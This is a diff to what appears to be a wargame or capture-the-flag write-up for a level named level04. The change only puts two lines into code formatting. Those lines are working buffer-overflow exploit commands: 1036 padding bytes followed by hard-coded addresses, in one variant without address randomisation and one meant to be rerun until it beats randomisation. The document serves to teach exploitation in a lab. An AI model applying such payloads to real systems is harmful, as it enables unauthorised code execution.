@@ -54,11 +54,11 @@ level04 is vulnerable to a buffer overflow but it is a bit tricky to exploit bec
 
 - working without address randomisation
 
-    gdb --args ./level04 `perl -e 'print "A" x 1036'``perl -e 'print "\xd0\xe3\xea\xf7\xde\xad\xbe\xef\xee\x6b\xfa\xf7"'`
+    ``` gdb --args ./level04 `perl -e 'print "A" x 1036'``perl -e 'print "\xd0\xe3\xea\xf7\xde\xad\xbe\xef\xee\x6b\xfa\xf7"'` ```
 
 - working with address randomisation. needs to be repeatedly run to succeed.
 
-    /levels/level04 `perl -e 'print "A" x 1036'``perl -e 'print "\xd0\xc3\x66\xf7\xde\xad\xbe\xef\xee\x4b\x76\xf7"'`
+    ``` /levels/level04 `perl -e 'print "A" x 1036'``perl -e 'print "\xd0\xc3\x66\xf7\xde\xad\xbe\xef\xee\x4b\x76\xf7"'` ```
 
 
 #Level 05
